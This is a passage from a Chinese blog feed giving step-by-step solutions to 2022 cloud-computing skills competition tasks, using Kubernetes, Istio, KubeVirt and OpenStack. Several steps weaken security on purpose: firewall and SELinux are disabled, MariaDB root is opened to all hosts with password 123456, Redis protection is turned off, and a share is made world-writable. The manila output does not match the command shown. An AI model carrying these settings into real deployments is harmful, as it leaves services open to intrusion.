#创建serviceAccount,授权角色[root@k8s-master-node1 jenkins]# cat rbac.ymlapiVersion: v1kind: ServiceAccountmetadata:  name: jenkins---apiVersion: rbac.authorization.k8s.io/v1kind: Rolemetadata:  name: jenkinsrules:- apiGroups:  - &quot;&quot;  resources:  - pods  - events  verbs:  - get  - list  - watch  - create  - update  - delete- apiGroups:  - &quot;&quot;  resources:  - pods/exec  verbs:  - get  - list  - watch  - create  - update  - delete- apiGroups:  - &quot;&quot;  resources:  - pods/log  verbs:  - get  - list  - watch  - create  - update  - delete- apiGroups:  - &quot;&quot;  resources:  - secrets,events  verbs:  - get---apiVersion: rbac.authorization.k8s.io/v1kind: RoleBindingmetadata:  name: jenkinsroleRef:  apiGroup: rbac.authorization.k8s.io  kind: Role  name: jenkinssubjects:- kind: ServiceAccount  name: jenkins  namespace: default#编写deploymen文件[root@k8s-master-node1 jenkins]# cat jenkins-deploy.yamlapiVersion: apps/v1kind: Deploymentmetadata:  labels:    app: jenkins  name: jenkinsspec:  replicas: 1  selector:    matchLabels:      app: jenkins  template:    metadata:      labels:        app: jenkins    spec:      serviceAccountName: jenkins      containers:      - image: jenkins/jenkins        name: jenkins        ports:        - containerPort: 8080        - containerPort: 50000        env:        - name: JAVA_OPTS          value: -Djava.util.logging.config.file=/var/jenkins_home/log.properties        volumeMounts:        - name: jenkins-home          mountPath: /var/jenkins_home      volumes:      - name: jenkins-home        hostPath:          path: /var/jenkins_home  ##注意改权限777 #创建svc,暴露端口[root@k8s-master-node1 jenkins]# cat jenkins-svc.yamlapiVersion: v1kind: Servicemetadata:  labels:    app: jenkins  name: jenkinsspec:  ports:  - port: 80    name: http    protocol: TCP    targetPort: 8080  - port: 5000    name: agent    protocol: TCP  selector:    app: jenkins  type: NodePort


若插件获取失败,可通过修改&#x2F;etc&#x2F;resove.conf 修改后重启jenkins

2.2.7 安装GitLab
将GitLab部署到default命名空间下，要求设置root用户密码，新建公开项目，并将提供的代码上传到该项目。
#部署deploy文件[root@k8s-master-node1 gitlab]# cat gitlab-deploy.yamlapiVersion: apps/v1kind: Deploymentmetadata:  labels:    app: gitlab  name: gitlabspec:  replicas: 1  selector:    matchLabels:      app: gitlab  template:    metadata:      labels:        app: gitlab    spec:      nodeName: k8s-master-node1      containers:      - image: gitlab/gitlab-ce        name: gitlab        ports:        - containerPort: 80        - containerPort: 22        - containerPort: 443        volumeMounts:        - name: gitlab-config          mountPath: /etc/gitlab        - name: gitlab-logs          mountPath: /var/log/gitlab        - name: gitlab-data          mountPath: /var/opt/gitlab      volumes:      - name: gitlab-config        hostPath:          path: /data/gitlab/config      - name: gitlab-logs        hostPath:          path: /data/gitlab/logs      - name: gitlab-data        hostPath:          path: /data/gitlab/data#部署svc服务,暴露端口[root@k8s-master-node1 gitlab]# cat gitlab-svc.yamlapiVersion: v1kind: Servicemetadata:  name: gitlab-svcspec:  ports:  - port: 80    targetPort: 80    nodePort: 30001  selector:    app: gitlab  type: NodePort    



2.2.8 配置Jenkins连接GitLab
在Jenkins中新建流水线任务，配置GitLab连接Jenkins，并完成WebHook的配置。
2.2.9 构建CI&#x2F;CD
在流水线任务中编写流水线脚本，完成后触发构建，要求基于GitLab中的项目自动完成代码编译、镜像构建与推送、并自动发布服务到Kubernetes集群中。
2.2.10 服务网格：创建Ingress Gateway
将Bookinfo应用部署到default命名空间下，请为Bookinfo应用创建一个网关，使外部可以访问Bookinfo应用。
#进行istio注入kubectl label namespace default istio-injection=enabled#Bookinfo部署[root@k8s-master-node1 istio-1.13.4]# cat samples/bookinfo/platform/kube/bookinfo.yaml# Copyright Istio Authors##   Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);#   you may not use this file except in compliance with the License.#   You may obtain a copy of the License at##       http://www.apache.org/licenses/LICENSE-2.0##   Unless required by applicable law or agreed to in writing, software#   distributed under the License is distributed on an &quot;AS IS&quot; BASIS,#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.#   See the License for the specific language governing permissions and#   limitations under the License.################################################################################################### This file defines the services, service accounts, and deployments for the Bookinfo sample.## To apply all 4 Bookinfo services, their corresponding service accounts, and deployments:##   kubectl apply -f samples/bookinfo/platform/kube/bookinfo.yaml## Alternatively, you can deploy any resource separately:##   kubectl apply -f samples/bookinfo/platform/kube/bookinfo.yaml -l service=reviews # reviews Service#   kubectl apply -f samples/bookinfo/platform/kube/bookinfo.yaml -l account=reviews # reviews ServiceAccount#   kubectl apply -f samples/bookinfo/platform/kube/bookinfo.yaml -l app=reviews,version=v3 # reviews-v3 Deployment##################################################################################################################################################################################################### Details service##################################################################################################apiVersion: v1kind: Servicemetadata:  name: details  labels:    app: details    service: detailsspec:  ports:  - port: 9080    name: http  selector:    app: details---apiVersion: v1kind: ServiceAccountmetadata:  name: bookinfo-details  labels:    account: details---apiVersion: apps/v1kind: Deploymentmetadata:  name: details-v1  labels:    app: details    version: v1spec:  replicas: 1  selector:    matchLabels:      app: details      version: v1  template:    metadata:      labels:        app: details        version: v1    spec:      serviceAccountName: bookinfo-details      containers:      - name: details        image: docker.io/istio/examples-bookinfo-details-v1:1.16.2        imagePullPolicy: IfNotPresent        ports:        - containerPort: 9080        securityContext:          runAsUser: 1000---################################################################################################### Ratings service##################################################################################################apiVersion: v1kind: Servicemetadata:  name: ratings  labels:    app: ratings    service: ratingsspec:  ports:  - port: 9080    name: http  selector:    app: ratings---apiVersion: v1kind: ServiceAccountmetadata:  name: bookinfo-ratings  labels:    account: ratings---apiVersion: apps/v1kind: Deploymentmetadata:  name: ratings-v1  labels:    app: ratings    version: v1spec:  replicas: 1  selector:    matchLabels:      app: ratings      version: v1  template:    metadata:      labels:        app: ratings        version: v1    spec:      serviceAccountName: bookinfo-ratings      containers:      - name: ratings        image: docker.io/istio/examples-bookinfo-ratings-v1:1.16.2        imagePullPolicy: IfNotPresent        ports:        - containerPort: 9080        securityContext:          runAsUser: 1000---################################################################################################### Reviews service##################################################################################################apiVersion: v1kind: Servicemetadata:  name: reviews  labels:    app: reviews    service: reviewsspec:  ports:  - port: 9080    name: http  selector:    app: reviews---apiVersion: v1kind: ServiceAccountmetadata:  name: bookinfo-reviews  labels:    account: reviews---apiVersion: apps/v1kind: Deploymentmetadata:  name: reviews-v1  labels:    app: reviews    version: v1spec:  replicas: 1  selector:    matchLabels:      app: reviews      version: v1  template:    metadata:      labels:        app: reviews        version: v1    spec:      serviceAccountName: bookinfo-reviews      containers:      - name: reviews        image: docker.io/istio/examples-bookinfo-reviews-v1:1.16.2        imagePullPolicy: IfNotPresent        env:        - name: LOG_DIR          value: &quot;/tmp/logs&quot;        ports:        - containerPort: 9080        volumeMounts:        - name: tmp          mountPath: /tmp        - name: wlp-output          mountPath: /opt/ibm/wlp/output        securityContext:          runAsUser: 1000      volumes:      - name: wlp-output        emptyDir: &#123;&#125;      - name: tmp        emptyDir: &#123;&#125;---apiVersion: apps/v1kind: Deploymentmetadata:  name: reviews-v2  labels:    app: reviews    version: v2spec:  replicas: 1  selector:    matchLabels:      app: reviews      version: v2  template:    metadata:      labels:        app: reviews        version: v2    spec:      serviceAccountName: bookinfo-reviews      containers:      - name: reviews        image: docker.io/istio/examples-bookinfo-reviews-v2:1.16.2        imagePullPolicy: IfNotPresent        env:        - name: LOG_DIR          value: &quot;/tmp/logs&quot;        ports:        - containerPort: 9080        volumeMounts:        - name: tmp          mountPath: /tmp        - name: wlp-output          mountPath: /opt/ibm/wlp/output        securityContext:          runAsUser: 1000      volumes:      - name: wlp-output        emptyDir: &#123;&#125;      - name: tmp        emptyDir: &#123;&#125;---apiVersion: apps/v1kind: Deploymentmetadata:  name: reviews-v3  labels:    app: reviews    version: v3spec:  replicas: 1  selector:    matchLabels:      app: reviews      version: v3  template:    metadata:      labels:        app: reviews        version: v3    spec:      serviceAccountName: bookinfo-reviews      containers:      - name: reviews        image: docker.io/istio/examples-bookinfo-reviews-v3:1.16.2        imagePullPolicy: IfNotPresent        env:        - name: LOG_DIR          value: &quot;/tmp/logs&quot;        ports:        - containerPort: 9080        volumeMounts:        - name: tmp          mountPath: /tmp        - name: wlp-output          mountPath: /opt/ibm/wlp/output        securityContext:          runAsUser: 1000      volumes:      - name: wlp-output        emptyDir: &#123;&#125;      - name: tmp        emptyDir: &#123;&#125;---################################################################################################### Productpage services##################################################################################################apiVersion: v1kind: Servicemetadata:  name: productpage  labels:    app: productpage    service: productpagespec:  ports:  - port: 9080    name: http  selector:    app: productpage---apiVersion: v1kind: ServiceAccountmetadata:  name: bookinfo-productpage  labels:    account: productpage---apiVersion: apps/v1kind: Deploymentmetadata:  name: productpage-v1  labels:    app: productpage    version: v1spec:  replicas: 1  selector:    matchLabels:      app: productpage      version: v1  template:    metadata:      labels:        app: productpage        version: v1    spec:      serviceAccountName: bookinfo-productpage      containers:      - name: productpage        image: docker.io/istio/examples-bookinfo-productpage-v1:1.16.2        imagePullPolicy: IfNotPresent        ports:        - containerPort: 9080        volumeMounts:        - name: tmp          mountPath: /tmp        securityContext:          runAsUser: 1000      volumes:      - name: tmp        emptyDir: &#123;&#125;---部署svc[root@k8s-master-node1 networking]# cat bookinfo-gateway.yamlapiVersion: networking.istio.io/v1alpha3kind: Gatewaymetadata:  name: bookinfo-gatewayspec:  selector:    istio: ingressgateway # use istio default controller  servers:  - port:      number: 80      name: http      protocol: HTTP    hosts:    - &quot;*&quot;---apiVersion: networking.istio.io/v1alpha3kind: VirtualServicemetadata:  name: bookinfospec:  hosts:  - &quot;*&quot;  gateways:  - bookinfo-gateway  http:  - match:    - uri:        exact: /productpage    - uri:        prefix: /static    - uri:        exact: /login    - uri:        exact: /logout    - uri:        prefix: /api/v1/products    route:    - destination:        host: productpage        port:          number: 9080



2.2.11 KubeVirt运维：创建VM
使用提供的镜像在default命名空间下创建一台VM，名称为exam，指定VM的内存、CPU、网卡和磁盘等配置。

在使用vmware虚拟机时,需要开启vmware虚拟化

#服务启动完成后启动这个命令[root@master ~]# kubectl -n kubevirt wait kv kubevirt --for condition=Availablekubevirt.kubevirt.io/kubevirt condition met[root@k8s-master-node1 vm]# cat virtual.yamlapiVersion: kubevirt.io/v1kind: VirtualMachinemetadata:  name: examspec:  running: false  template:    metadata:      labels:        kubevirt.io/size: small        kubevirt.io/domain: exam    spec:      domain:        devices:          disks:            - name: containerdisk              disk:                bus: virtio            - name: cloudinitdisk              disk:                bus: virtio          interfaces:          - name: default            masquerade: &#123;&#125;        resources:          requests:            memory: 64M      networks:      - name: default        pod: &#123;&#125;      volumes:        - name: containerdisk          containerDisk:            image: quay.io/kubevirt/cirros-container-disk-demo        - name: cloudinitdisk          cloudInitNoCloud:            userDataBase64: SGkuXG4=[root@master kubevirt]# kubectl apply -f virtual.yamlvirtualmachine.kubevirt.io/exam created[root@master kubevirt]# kubectl get vmNAME        AGE   VOLUMEexam	   21m

使用方法
#启动实例[root@master kubevirt]# virtctl start examVM exam was scheduled to start[root@master kubevirt]# kubectl get vmiNAME        AGE   PHASE     IP            NODENAMEexam   62s   Running   10.244.0.15   master# 进入虚拟机[root@master kubevirt]# virtctl console exam Successfully connected to vm-cirros console. The escape sequence is ^]login as &#x27;cirros&#x27; user. default password: &#x27;gocubsgo&#x27;. use &#x27;sudo&#x27; for root.vm-cirros login: cirrosPassword:$ ip a1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue qlen 1    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00    inet 127.0.0.1/8 scope host lo       valid_lft forever preferred_lft forever    inet6 ::1/128 scope host       valid_lft forever preferred_lft forever2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1450 qdisc pfifo_fast qlen 1000    link/ether 2e:3e:2a:46:29:94 brd ff:ff:ff:ff:ff:ff    inet 10.244.0.16/24 brd 10.244.0.255 scope global eth0       valid_lft forever preferred_lft forever    inet6 fe80::2c3e:2aff:fe46:2994/64 scope link tentative flags 08       valid_lft forever preferred_lft forever       $    #  按 ctrl+]  退出虚拟机#启动和停止命令## Start the virtual machine:  启动虚拟机virtctl start vm   ## Stop the virtual machine:  停止虚拟机virtctl stop vm#vm作为服务公开 VirtualMachine可以作为服务公开。实际服务将在 VirtualMachineInstance 启动后可用。[root@master kubevirt]# virtctl expose virtualmachine  exam --name vmiservice-node  --target-port 22  --port 24 --type NodePortService vmiservice-node successfully exposed for virtualmachine vm-cirros[root@master kubevirt]# kubectl get svcNAME              TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)        AGEkubernetes        ClusterIP   10.96.0.1       &lt;none&gt;        443/TCP        95dvmiservice-node   NodePort    10.106.62.191   &lt;none&gt;        24:31912/TCP   3s





2.2.12 完成容器云平台的调优或排错工作。（本任务只公布考试范围，不公布赛题）
任务3 容器云运维开发（10分）2.3.1 管理job服务
Kubernetes Python运维脚本开发-使用SDK方式管理job服务。
2.3.2 自定义调度器
Kubernetes Python运维脚本开发-使用Restful API方式管理调度器。
2.3.3 编写Kubernetes容器云平台自动化运维工具。（本任务只公布考试范围，不公布赛题）
模块三 公有云（40分）企业选择国内公有云提供商，选择云主机、云网络、云硬盘、云防火墙、负载均衡等服务，可创建Web服务，共享文件存储服务，数据库服务，数据库集群等服务。搭建基于云原生的DevOps相关服务，构建云、边、端一体化的边缘计算系统，并开发云应用程序。
根据上述公有云平台的特性，完成公有云中的各项运维工作。
*任务1 公有云服务搭建（5分）*3.1.1 私有网络管理
在公有云中完成虚拟私有云网络的创建。
3.1.2 云实例管理
登录公有云平台，创建两台云实例虚拟机。
3.1.3 管理数据库
使用intnetX-mysql网络创建两台chinaskill-sql-1和chinaskill-sql-2云服务器，并完成MongoDB安装。
3.1.4 主从数据库
在chinaskill-sql-1和chinaskill-sql-2云服务器中配置MongoDB主从数据库。
3.1.5 node环境管理
使用提供的压缩文件，安装Node.js环境。
3.1.6 安全组管理
根据要求，创建一个安全组。
3.1.7 RocketChat上云
使用http服务器提供文件，将Rocket.Chat应用部署上云。
3.1.8 NAT网关
根据要求创建一个公网NAT网关。
3.1.9云服务器备份
创建一个云服务器备份存储库名为server_backup，容量为100G。将ChinaSkill-node-1云服务器制作镜像文件chinaskill-image。
3.1.10 负载均衡器
根据要求创建一个负载均衡器chinaskill-elb。
3.1.11 弹性伸缩管理
根据要求新建一个弹性伸缩启动配置。
*任务2 公有云服务运维（10分）*3.2.1 云容器引擎
在公有云上，按照要求创建一个x86架构的容器云集群。
3.2.2 云容器管理
使用插件管理在kcloud容器集群中安装Dashboard可视化监控界面。
3.2.3 使用kubectl操作集群
在kcloud集群中安装kubectl命令，使用kubectl命令管理kcloud集群。
3.2.4 安装Helm
使用提供的Helm软件包，在kcloud集群中安装Helm服务。
3.2.5 根据提供的chart包mariadb-7.3.14.tgz部署mariadb服务，修改mariadb使用NodePort模式对其进行访问。
3.2.6 在k8s集群中创建mariadb命名空间，根据提供的chart包mariadb-7.3.14.tgz修改其配置，使用NodePort模式对其进行访问。
任务3 公有云运维开发（10分）3.3.1 开发环境搭建
创建一台云主机，并登录此云服务器，安装Python3.68运行环境与SDK依赖库。
3.3.2 安全组管理
调用api安全组的接口，实现安全组的增删查改。
3.3.3 安全组规则管理
调用SDK安全组规则的方法，实现安全组规则的增删查改。
3.3.4 云主机管理
调用SDK云主机管理的方法，实现云主机的的增删查改。
3.3.5 完成公有云平台自动化运维程序开发。（本任务只公布考试范围，不公布赛题）
*任务4 边缘计算系统运维（10分）*3.4.1 云端部署
构建Kubernetes容器云平台，云端部署KubeEdge CloudCore云测模块，并启动cloudcore服务。
3.4.2 边端部署
在边侧部署KubeEdge EdgeCore边侧模块，并启动edgecore服务。
3.4.3 边缘应用部署
通过边缘计算平台完成应用场景镜像部署与调试。（本任务只公布考试范围，不公布赛题）
*任务5 边缘计算云应用开发（5分）*3.5.1 对接边缘计算系统，完成云应用微服务开发。（本任务只公布考试范围，不公布赛题） 
]]></content>
      <categories>
        <category>云计算</category>
        <category>技能大赛汇总</category>
      </categories>
      <tags>
        <tag>云计算</tag>
        <tag>云计算职业技能大赛</tag>
      </tags>
  </entry>
  <entry>
    <title>云计算方向-2022年云计算技能国赛私有云套题</title>
    <url>/posts/2c8237f4.html</url>
    <content><![CDATA[第一套私有云运维任务：题目3. OpenStack云平台运维（10分）1.使用提供的云安全框架组件，将提供的OpenStack云平台的安全策略从http优化至https。可能会遇到 mod_ssl 安装不成功的问题，原因是mod_ssl版本不匹配，上传mod_ssl-2.4.6-97.el7.centos.x86_64.rpm
①安装工具包
yum install -y mod_wsgi httpd mod_ssl

②修改&#x2F;etc&#x2F;openstack-dashboard&#x2F;local_settings文件
vi /etc/openstack-dashboard/local_settings##在DEBUG = False下增加4行USE_SSL = TrueCSRF_COOKIE_SECURE = True		##原文中有，去掉注释即可SESSION_COOKIE_SECURE = True		##原文中有，去掉注释即可SESSION_COOKIE_HTTPONLY = True

③修改&#x2F;etc&#x2F;httpd&#x2F;conf.d&#x2F;ssl.conf配置文件
vi /etc/httpd/conf.d/ssl.conf##将SSLProtocol all -SSLv2 -SSLv3改成：SSLProtocol all -SSLv2

④重启服务
systemctl restart httpdsystemctl restart memcached


访问Web

2.在提供的OpenStack平台上，通过修改相关参数对openstack平台进行调优操作，相应的调优操作有：（1）设置内存超售比例为1.5倍；
（2）设置nova服务心跳检查时间为120秒。
vi /etc/nova/nova.confram_allocation_ratio = 1.5service_down_time = 120

3.在提供的OpenStack平台上，使用Swift对象存储服务，修改相应的配置文件，使对象存储Swift作为glance镜像服务的后端存储。①修改配置文件
vi &#x2F;etc&#x2F;glance&#x2F;glance-api.conf
[glance_store]stores=glance.store.filesystem.Store,glance.store.swift.Store,glance.store.http.Storedefault_store=swiftswift_store_region=RegionOneswift_store_endpoint_type=internalURLswift_store_container=glanceswift_store_large_object_size=5120swift_store_large_object_chunk_size=200swift_store_create_container_on_put=Trueswift_store_multi_tenant=Trueswift_store_admin_tenants=serviceswift_store_auth_address=http://controller:5000/v3swift_store_user=glanceswift_store_key=000000

重启 glance 所有组件
systemctl restart openstack-glance-*

4.在提供的OpenStack平台上，编写heat模板createvm.yml文件，模板作用为按照要求创建一个云主机。 cat createvm.ymlheat_template_version: 2018-08-31resources:  server1:    type: OS::Nova::Server    properties:      name: mytest1      image: &quot;centos7.5&quot;      flavor: &quot;small&quot;      networks:        - network: &quot;intnet&quot;outputs:  server_names:    value: &#123; get_attr: [ server1 , name ] &#125;openstack stack create -t createvm.yml vm

5.在提供的OpenStack平台上，对cinder存储空间进行扩容操作，要求将cinder存储空间扩容10G。[root@compute ~]# lsblkNAME                                            MAJ:MIN RM  SIZE RO TYPE MOUNTPOINTsda                                               8:0    0  200G  0 disk├─sda1                                            8:1    0    1G  0 part /boot└─sda2                                            8:2    0   19G  0 part  ├─centos-root                                 253:0    0   17G  0 lvm  /  └─centos-swap                                 253:1    0    2G  0 lvm  [SWAP]sdb                                               8:16   0   50G  0 disk├─sdb1                                            8:17   0   10G  0 part│ ├─cinder--volumes-cinder--volumes--pool_tmeta 253:2    0   12M  0 lvm│ │ └─cinder--volumes-cinder--volumes--pool     253:4    0  9.5G  0 lvm│ └─cinder--volumes-cinder--volumes--pool_tdata 253:3    0  9.5G  0 lvm│   └─cinder--volumes-cinder--volumes--pool     253:4    0  9.5G  0 lvm├─sdb2                                            8:18   0   10G  0 part /swift/node/sdb2├─sdb3                                            8:19   0   10G  0 part└─sdb4                                            8:20   0    5G  0 partsr0                                              11:0    1  4.4G  0 rom[root@compute ~]#[root@compute ~]# vgdisplay  --- Volume group ---  VG Name               cinder-volumes  System ID  Format                lvm2  Metadata Areas        1  Metadata Sequence No  4  VG Access             read/write  VG Status             resizable  MAX LV                0  Cur LV                1  Open LV               0  Max PV                0  Cur PV                1  Act PV                1  VG Size               &lt;10.00 GiB  PE Size               4.00 MiB  Total PE              2559  Alloc PE / Size       2438 / 9.52 GiB  Free  PE / Size       121 / 484.00 MiB  VG UUID               3k0yKg-iQB2-b2CM-a0z2-2ddJ-cdG3-8WpyrG  --- Volume group ---  VG Name               centos  System ID  Format                lvm2  Metadata Areas        1  Metadata Sequence No  3  VG Access             read/write  VG Status             resizable  MAX LV                0  Cur LV                2  Open LV               2  Max PV                0  Cur PV                1  Act PV                1  VG Size               &lt;19.00 GiB  PE Size               4.00 MiB  Total PE              4863  Alloc PE / Size       4863 / &lt;19.00 GiB  Free  PE / Size       0 / 0  VG UUID               acAXNK-eqKm-qs9b-ly3T-R3Sh-8qyv-nELNWv  [root@compute ~]# vgextend cinder-volumes /dev/sdb4  Volume group &quot;cinder-volumes&quot; successfully extended[root@compute ~]# vgdisplay  --- Volume group ---  VG Name               cinder-volumes  System ID  Format                lvm2  Metadata Areas        2  Metadata Sequence No  5  VG Access             read/write  VG Status             resizable  MAX LV                0  Cur LV                1  Open LV               0  Max PV                0  Cur PV                2  Act PV                2  VG Size               14.99 GiB  PE Size               4.00 MiB  Total PE              3838  Alloc PE / Size       2438 / 9.52 GiB  Free  PE / Size       1400 / &lt;5.47 GiB  VG UUID               3k0yKg-iQB2-b2CM-a0z2-2ddJ-cdG3-8WpyrG  --- Volume group ---  VG Name               centos  System ID  Format                lvm2  Metadata Areas        1  Metadata Sequence No  3  VG Access             read/write  VG Status             resizable  MAX LV                0  Cur LV                2  Open LV               2  Max PV                0  Cur PV                1  Act PV                1  VG Size               &lt;19.00 GiB  PE Size               4.00 MiB  Total PE              4863  Alloc PE / Size       4863 / &lt;19.00 GiB  Free  PE / Size       0 / 0  VG UUID               acAXNK-eqKm-qs9b-ly3T-R3Sh-8qyv-nELNWv

6.在OpenStack私有云平台，创建一台云主机，使用提供的软件包，编写一键部署脚本，要求可以一键部署gpmall商城应用系统。手动部署Ⅰ.环境配置
①修改主机名
hostnamectl set-hostname mall

②配置&#x2F;etc&#x2F;hosts主机映射
vi /etc/hosts192.168.200.103 mall

③关闭防火墙和selinux
#关闭防火墙systemctl stop firewalld &amp;&amp; systemctl disable firewalld#关闭安全策略setenforce 0 sed -i &#x27;s/SELINUX=enforcing/SELINUX=disabled/g&#x27; /etc/selinux/config

④配置本地仓库
#上传相对应的镜像和gpmall-repomkdir /opt/centosmount CentOS-7-x86_64-DVD-1804.iso  /opt/centos/mv /etc/yum.repos.d/* /etc/yumvi /etc/yum.repos.d/local.repo[centos]name=centosbaseurl=file:///opt/centosgpgcheck=0enabled=1[gpmall-mall]name=gpmall-mallbaseurl=file:///root/gpmall-repogpgcheck=0enabled=1

Ⅱ.应用系统的基础服务安装
①安装java环境
yum install -y java-1.8.0-openjdk java-1.8.0-openjdk-devel[root@mall ~]# java -versionopenjdk version &quot;1.8.0_222&quot;OpenJDK Runtime Environment (build 1.8.0_222-b10)OpenJDK 64-Bit Server VM (build 25.222-b10, mixed mode)

②安装redis,nginx,mariadb
yum install redis nginx mariadb mariadb-server -y

③安装zookeeper
#上传安装包tar -zxvf zookeeper-3.4.14.tar.gz -C /opt/#进入到zookeeper-3.4.14/bin目录下，并启动ZooKeeper服务cd /opt/zookeeper-3.4.14/confmv zoo_sample.cfg zoo.cfgcd ../bin./zkServer.sh start#查看状态./zkServer.sh status

④安装kafka
#将提供的kafka_2.11-1.1.1.tgz包上传到服务器的/opt目录下，并解压该压缩包tar -zxvf kafka_2.11-1.1.1.tgz -C /opt/#进入到kafka_2.11-1.1.1/bin目录下，启动Kafka服务cd kafka_2.11-1.1.1/bin/ ./kafka-server-start.sh -daemon ../config/server.properties#查看是否成功启动[root@mall ~]# jps11371 QuorumPeerMain11692 Kafka13183 Jps

Ⅲ修改服务配置
①配置mariadb服务
#修改/etc/my.cnf配置文件vi /etc/my.cnf[mysqld]port=8066 #若使用的是项目四软件包init_connect=&#x27;SET collation_connection = utf8_unicode_ci&#x27;init_connect=&#x27;SET NAMES utf8&#x27;character-set-server=utf8collation-server=utf8_unicode_ciskip-character-set-client-handshake#启动数据库服务systemctl start mariadb#设置密码mysqladmin -uroot password 123456#配置授权mysql -uroot -p123456-&gt; grant all privileges on *.* to root@localhost identified by &#x27;123456&#x27; with grant option;-&gt; grant all privileges on *.* to root@&quot;%&quot; identified by &#x27;123456&#x27; with grant option;#将gpmall.sql上传到root#创建数据库gpmall并导入gpmall.sql文件-&gt; create database gpmall;-&gt; source /root/gpmall.sql-&gt; exit

②配置reids服务
#修改Redis配置文件，编辑/etc/redis.conf文件vi /etc/redis.conf # 将61行的bind 127.0.0.1这一行注释掉（在前面加个#号注释） #将80行的protected-mode yes 改为 protected-mode no#启动服务systemctl start redissystemctl enable redis

③配置nginx
#启动服务systemctl start nginxsystemctl enable nginx

Ⅳ修改全局变量
#根据jar报的错误修改hostsvi /etc/hosts127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4::1         localhost localhost.localdomain localhost6 localhost6.localdomain6192.168.200.103 mall192.168.200.103 kafka1.mall127.0.0.1 mysql.mall192.168.200.103 redis.mall192.168.200.103 zk1.mall#部署前端rm -rf /usr/share/nginx/html/*cp -rvf /root/dist/* /usr/share/nginx/html/vi /etc/nginx/conf.d/default.conf #注意对齐 location /user &#123;     proxy_pass http://127.0.0.1:8082; &#125; location /shopping &#123;     proxy_pass http://127.0.0.1:8081; &#125; location /cashier &#123;     proxy_pass http://127.0.0.1:8083; &#125; #重启Nginx服务 systemctl restart nginx#部署后端nohup java -jar shopping-provider-0.0.1-SNAPSHOT.jar &amp;nohup java -jar user-provider-0.0.1-SNAPSHOT.jar &amp;nohup java -jar gpmall-shopping-0.0.1-SNAPSHOT.jar &amp;nohup java -jar gpmall-user-0.0.1-SNAPSHOT.jar &amp; #验证状态 jobs



7.使用manila共享文件系统服务，使manila为多租户云环境中的共享文件系统提供统一的管理服务。使用Manila命令创建default_type_share共享类型
[root@controller ~]# source /etc/keystone/admin-openrc.sh [root@controller ~]# manila type-create default_share_type False+----------------------+--------------------------------------+| Property             | Value                                |+----------------------+--------------------------------------+| required_extra_specs | driver_handles_share_servers : False || Name                 | default_share_type                   || Visibility           | public                               || is_default           | YES                                  || ID                   | 0fec7bca-f1a1-4e92-8d4b-aaf02147571a || optional_extra_specs |                                      || Description          | None                                 |+----------------------+--------------------------------------+‘#查看类型列表信息[root@controller ~]# manila type-list+--------------------------------------+--------------------+------------+------------+--------------------------------------+----------------------+-------------+| ID                                   | Name               | visibility | is_default | required_extra_specs                 | optional_extra_specs | Description |+--------------------------------------+--------------------+------------+------------+--------------------------------------+----------------------+-------------+| 0fec7bca-f1a1-4e92-8d4b-aaf02147571a | default_share_type | public     | YES        | driver_handles_share_servers : False |                      | None        |+--------------------------------------+--------------------+------------+------------+--------------------------------------+----------------------+-------------+

创建共享文件目录
#创建目录大小为2g的共享目录shre-test[root@controller ~]# manila create NFS 2 --name share-test+---------------------------------------+--------------------------------------+| Property                              | Value                                |+---------------------------------------+--------------------------------------+| status                                | creating                             || share_type_name                       | default_share_type                   || description                           | None                                 || availability_zone                     | None                                 || share_network_id                      | None                                 || share_server_id                       | None                                 || share_group_id                        | None                                 || host                                  |                                      || revert_to_snapshot_support            | False                                || access_rules_status                   | active                               || snapshot_id                           | None                                 || create_share_from_snapshot_support    | False                                || is_public                             | False                                || task_state                            | None                                 || snapshot_support                      | False                                || id                                    | a4b2a4f1-421f-4de3-8fca-d2ee8a5f4bb9 || size                                  | 2                                    || source_share_group_snapshot_member_id | None                                 || user_id                               | 89f8027475294689ae6c0183fa35bf5a     || name                                  | share-test                           || share_type                            | 0fec7bca-f1a1-4e92-8d4b-aaf02147571a || has_replicas                          | False                                || replication_type                      | None                                 || created_at                            | 2022-05-06T11:24:02.000000           || share_proto                           | NFS                                  || mount_snapshot_support                | False                                || project_id                            | 0b6f2d0be1d342e09edc31dc841db7a5     || metadata                              | &#123;&#125;                                   |+---------------------------------------+--------------------------------------+#查询所创建的共享目录列表信息[root@controller ~]# manila list+--------------------------------------+------------+------+-------------+-----------+-----------+--------------------+--------------------------------+-------------------+| ID                                   | Name       | Size | Share Proto | Status    | Is Public | Share Type Name    | Host                           | Availability Zone |+--------------------------------------+------------+------+-------------+-----------+-----------+--------------------+--------------------------------+-------------------+| a4b2a4f1-421f-4de3-8fca-d2ee8a5f4bb9 | share-test | 2    | NFS         | available | False     | default_share_type | controller@lvm#lvm-single-pool | nova              |+--------------------------------------+------------+------+-------------+-----------+-----------+--------------------+--------------------------------+-------------------+

#使用Manila命令开放share-test目录对OpenStack管理网段使用权限[root@controller ~]# manila access-allow share-test ip  0.0.0.0/24 --access-level rw+--------------+--------------------------------------+| Property     | Value                                |+--------------+--------------------------------------+| access_key   | None                                 || share_id     | a4b2a4f1-421f-4de3-8fca-d2ee8a5f4bb9 || created_at   | 2022-05-06T11:27:19.000000           || updated_at   | None                                 || access_type  | ip                                   || access_to    | 0.0.0.0/24                       || access_level | rw                                   || state        | queued_to_apply                      || id           | 9813f7f2-d15f-46cf-ad2d-062ce6ce3264 || metadata     | &#123;&#125;                                   |+--------------+--------------------------------------+#查看share-test目录共享目录权限及开放网段[root@controller ~]# manila access-list share-test+--------------------------------------+-------------+----------------+--------------+--------+------------+----------------------------+------------+| id                                   | access_type | access_to      | access_level | state  | access_key | created_at                 | updated_at |+--------------------------------------+-------------+----------------+--------------+--------+------------+----------------------------+------------+| 9813f7f2-d15f-46cf-ad2d-062ce6ce3264 | ip          | 10.24.195.0/24 | rw           | active | None       | 2022-05-06T11:27:19.000000 | None       |+--------------------------------------+-------------+----------------+--------------+--------+------------+----------------------------+------------+

